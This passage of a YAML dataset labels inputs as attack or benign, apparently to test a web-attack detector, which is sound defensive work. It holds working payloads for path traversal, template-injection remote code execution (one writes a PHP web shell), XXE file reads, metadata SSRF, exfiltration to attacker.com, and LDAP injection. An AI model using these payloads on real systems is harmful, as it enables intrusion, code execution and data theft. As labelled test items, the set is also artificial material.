+    input: "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
+    expected: 1
+    difficulty: hard
+    description: "Windows hosts file with double backslash"
+  
+  - id: path_029
+    category: path_traversal
+    subcategory: basic
+    input: "../../../var/www/html/.htaccess"
+    expected: 1
+    difficulty: medium
+    description: "Htaccess file access"
+  
+  - id: path_030
+    category: path_traversal
+    subcategory: basic
+    input: "../../../usr/local/apache2/conf/httpd.conf"
+    expected: 1
+    difficulty: medium
+    description: "Apache httpd.conf access"
+  
+  # SSTI - 20 scenarios
+  - id: ssti_001
+    category: ssti
+    subcategory: jinja2
+    input: "{{7*7}}"
+    expected: 1
+    difficulty: easy
+    description: "Basic Jinja2 SSTI"
+  
+  - id: ssti_002
+    category: ssti
+    subcategory: jinja2
+    input: "{{config.items()}}"
+    expected: 1
+    difficulty: medium
+    description: "Jinja2 config access"
+  
+  - id: ssti_003
+    category: ssti
+    subcategory: jinja2
+    input: "{{''.__class__.__mro__[1].__subclasses__()}}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 class traversal"
+  
+  - id: ssti_004
+    category: ssti
+    subcategory: twig
+    input: "{{7*'7'}}"
+    expected: 1
+    difficulty: easy
+    description: "Basic Twig SSTI"
+  
+  - id: ssti_005
+    category: ssti
+    subcategory: twig
+    input: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    expected: 1
+    difficulty: hard
+    description: "Twig RCE"
+  
+  - id: ssti_006
+    category: ssti
+    subcategory: freemarker
+    input: "${7*7}"
+    expected: 1
+    difficulty: easy
+    description: "Basic FreeMarker SSTI"
+  
+  - id: ssti_007
+    category: ssti
+    subcategory: freemarker
+    input: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+    expected: 1
+    difficulty: hard
+    description: "FreeMarker RCE"
+  
+  - id: ssti_008
+    category: ssti
+    subcategory: jinja2
+    input: "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c()._module.__builtins__['__import__']('os').system('id') }}{% endif %}{% endfor %}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 RCE via catch_warnings"
+  
+  - id: ssti_009
+    category: ssti
+    subcategory: jinja2
+    input: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 RCE via request"
+  
+  - id: ssti_010
+    category: ssti
+    subcategory: velocity
+    input: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+    expected: 1
+    difficulty: hard
+    description: "Velocity RCE"
+  
+  - id: ssti_011
+    category: ssti
+    subcategory: jinja2
+    input: "{{lipsum.__globals__['os'].popen('id').read()}}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 RCE via lipsum"
+  
+  - id: ssti_012
+    category: ssti
+    subcategory: jinja2
+    input: "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 RCE via cycler"
+  
+  - id: ssti_013
+    category: ssti
+    subcategory: jinja2
+    input: "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 RCE via joiner"
+  
+  - id: ssti_014
+    category: ssti
+    subcategory: jinja2
+    input: "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+    expected: 1
+    difficulty: hard
+    description: "Jinja2 RCE via namespace"
+  
+  - id: ssti_015
+    category: ssti
+    subcategory: erb
+    input: "<%= 7*7 %>"
+    expected: 1
+    difficulty: easy
+    description: "Basic ERB SSTI"
+  
+  - id: ssti_016
+    category: ssti
+    subcategory: erb
+    input: "<%= system('id') %>"
+    expected: 1
+    difficulty: hard
+    description: "ERB RCE"
+  
+  - id: ssti_017
+    category: ssti
+    subcategory: smarty
+    input: "{php}echo `id`;{/php}"
+    expected: 1
+    difficulty: hard
+    description: "Smarty PHP execution"
+  
+  - id: ssti_018
+    category: ssti
+    subcategory: smarty
+    input: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearConfig())}"
+    expected: 1
+    difficulty: hard
+    description: "Smarty file write"
+  
+  - id: ssti_019
+    category: ssti
+    subcategory: mako
+    input: "${7*7}"
+    expected: 1
+    difficulty: easy
+    description: "Basic Mako SSTI"
+  
+  - id: ssti_020
+    category: ssti
+    subcategory: mako
+    input: "<%import os%>${os.system('id')}"
+    expected: 1
+    difficulty: hard
+    description: "Mako RCE"
+  
+  # XXE - 10 scenarios
+  - id: xxe_001
+    category: xxe
+    subcategory: basic
+    input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: medium
+    description: "Basic XXE file read"
+  
+  - id: xxe_002
+    category: xxe
+    subcategory: blind
+    input: "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>"
+    expected: 1
+    difficulty: hard
+    description: "Blind XXE with external DTD"
+  
+  - id: xxe_003
+    category: xxe
+    subcategory: parameter_entity
+    input: "<!DOCTYPE foo [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>"
+    expected: 1
+    difficulty: hard
+    description: "Parameter entity XXE"
+  
+  - id: xxe_004
+    category: xxe
+    subcategory: basic
+    input: "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: medium
+    description: "XXE shadow file read"
+  
+  - id: xxe_005
+    category: xxe
+    subcategory: basic
+    input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: hard
+    description: "XXE with PHP filter"
+  
+  - id: xxe_006
+    category: xxe
+    subcategory: basic
+    input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: hard
+    description: "XXE with expect wrapper"
+  
+  - id: xxe_007
+    category: xxe
+    subcategory: blind
+    input: "<!DOCTYPE foo [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil;]>"
+    expected: 1
+    difficulty: hard
+    description: "Blind XXE data exfiltration"
+  
+  - id: xxe_008
+    category: xxe
+    subcategory: basic
+    input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: medium
+    description: "XXE Windows hosts file"
+  
+  - id: xxe_009
+    category: xxe
+    subcategory: basic
+    input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: hard
+    description: "XXE SSRF to AWS metadata"
+  
+  - id: xxe_010
+    category: xxe
+    subcategory: basic
+    input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'jar:file:///var/www/html/shell.jar!/'>]><foo>&xxe;</foo>"
+    expected: 1
+    difficulty: hard
+    description: "XXE with JAR protocol"
+  
+  # LDAP Injection - 10 scenarios
+  - id: ldap_001
+    category: ldap
+    subcategory: injection
+    input: "*)(uid=*))(|(uid=*"
+    expected: 1
+    difficulty: medium
+    description: "LDAP injection bypass"
+  
+  - id: ldap_002
+    category: ldap
+    subcategory: injection
+    input: "admin)(&)"
+    expected: 1
+    difficulty: easy
+    description: "LDAP admin bypass"
+  
+  - id: ldap_003
+    category: ldap
+    subcategory: injection
+    input: "*)(objectClass=*"
+    expected: 1
+    difficulty: medium
+    description: "LDAP wildcard injection"
+  
+  - id: ldap_004
+    category: ldap
+    subcategory: injection
+    input: "*))(|(password=*"
+    expected: 1
+    difficulty: medium
+    description: "LDAP password enumeration"
+  
+  - id: ldap_005
+    category: ldap
+    subcategory: injection
+    input: "*)(cn=*))%00"
+    expected: 1
+    difficulty: hard
+    description: "LDAP null byte injection"
+  
+  - id: ldap_006
+    category: ldap
+    subcategory: injection
+    input: "admin*"
+    expected: 1
+    difficulty: easy
+    description: "LDAP wildcard search"
+  
+  - id: ldap_007
+    category: ldap
+    subcategory: injection
+    input: "*))(|(mail=*"
+    expected: 1
+    difficulty: medium
+    description: "LDAP mail enumeration"
+  
+  - id: ldap_008
+    category: ldap
+    subcategory: injection
+    input: "*)(userPassword=*"
+    expected: 1
+    difficulty: hard
+    description: "LDAP password extraction"
+  
+  - id: ldap_009
+    category: ldap
+    subcategory: injection
+    input: "*))(|(sAMAccountName=*"
+    expected: 1
+    difficulty: medium
+    description: "LDAP Active Directory injection"
+  
+  - id: ldap_010
+    category: ldap
+    subcategory: injection
+    input: "*)(memberOf=*"
+    expected: 1
+    difficulty: medium
+    description: "LDAP group membership enumeration"
+  
+  # Benign Edge Cases - 10 scenarios
+  - id: benign_001
+    category: benign
+    subcategory: edge_case
+    input: "SELECT * FROM menu WHERE category='desserts'"
+    expected: 0
+    difficulty: medium
+    description: "Benign SQL-like query in restaurant context"
+  
+  - id: benign_002
+    category: benign
+    subcategory: edge_case
+    input: "<3 love this product!"
+    expected: 0
+    difficulty: hard
+    description: "Heart emoji that looks like HTML tag"
+  
+  - id: benign_003
+    category: benign
+    subcategory: edge_case
+    input: "john.doe@example.com"
+    expected: 0
+    difficulty: easy
+    description: "Normal email address"
+  
+  - id: benign_004
+    category: benign
+    subcategory: edge_case
+    input: "C:\\Users\\John\\Documents\\report.pdf"
+    expected: 0
+    difficulty: medium
+    description: "Windows file path"
+  
+  - id: benign_005
+    category: benign
+    subcategory: edge_case
+    input: "/home/user/documents/file.txt"
+    expected: 0
+    difficulty: easy
+    description: "Linux file path"
+  
+  - id: benign_006
+    category: benign
+    subcategory: edge_case
+    input: "Price: $19.99 (20% off!)"
+    expected: 0
+    difficulty: easy
+    description: "Price with special characters"
+  
+  - id: benign_007
+    category: benign
+    subcategory: edge_case
+    input: "Meeting at 2:00 PM | Conference Room A"
+    expected: 0
+    difficulty: medium
+    description: "Schedule with pipe character"
+  
+  - id: benign_008
+    category: benign
+    subcategory: edge_case
+    input: "if (condition) { doSomething(); }"
+    expected: 0
+    difficulty: hard
+    description: "JavaScript code snippet in documentation"
+  
+  - id: benign_009
+    category: benign
+    subcategory: edge_case
+    input: "Q&A session tomorrow at 3pm"
+    expected: 0
+    difficulty: easy
+    description: "Ampersand in normal text"
+  
+  - id: benign_010
+    category: benign
+    subcategory: edge_case
+    input: "Version 2.0.1-beta (build #1234)"
+    expected: 0
+    difficulty: easy
+    description: "Version string with special characters"
